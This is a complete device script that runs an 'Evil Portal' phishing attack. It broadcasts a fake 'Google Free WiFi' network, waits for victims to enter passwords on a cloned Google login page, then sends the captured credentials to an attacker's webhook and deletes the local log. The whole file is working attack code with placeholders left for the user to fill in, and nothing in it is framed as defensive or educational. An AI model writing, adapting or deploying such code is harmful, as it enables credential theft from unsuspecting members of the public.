// 1. Start the Evil Portal
wifi.stop();
wifi.set_ssid("Google Free WiFi"); // Convincing SSID
wifi.start_portal("/DarkLugia/portals/Google/index.html");

display.clear();
display.draw_image("/DarkLugia/assets/splash.png", 0, 0); 
display.print("\nPortal: Google Auth");
display.print("Status: WAITING FOR TARGET...");

// 2. Monitoring Loop
while(true) {
    if (storage.exists("/DarkLugia/logs/passwords.txt")) {
        // Read the captured credentials
        let creds = storage.read("/DarkLugia/logs/passwords.txt");
        
        display.print("DATA FOUND! BEAMING...");

        // 3. Connect to internet to send email
        // Replace with your phone hotspot or home wifi
        wifi.connect("Your_WiFi_Name", "Your_WiFi_Password");

        if (wifi.is_connected()) {
            // Send to your Webhook (same as Xfinity)
            http.get("YOUR_WEBHOOK_URL_HERE?source=Google&data=" + creds);
            
            // 4. Success Feedback
            audio.play("/DarkLugia/assets/roar.wav"); // The Mew Roar!
            display.print("EMAIL SENT TO MASTER KRAMER");

            // 5. Cleanup
            storage.remove("/DarkLugia/logs/passwords.txt");
            break; 
        }
    }
    delay(5000); // Check for new logins every 5 seconds
}
